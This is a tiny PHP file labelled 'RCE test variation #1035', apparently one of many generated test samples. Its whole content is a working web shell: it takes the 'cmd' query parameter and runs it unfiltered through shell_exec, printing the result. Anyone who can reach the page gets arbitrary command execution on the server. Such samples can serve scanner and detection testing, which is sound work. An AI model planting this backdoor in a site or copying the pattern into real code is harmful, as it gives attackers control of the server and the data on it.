<?php
// RCE test variation #1035
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>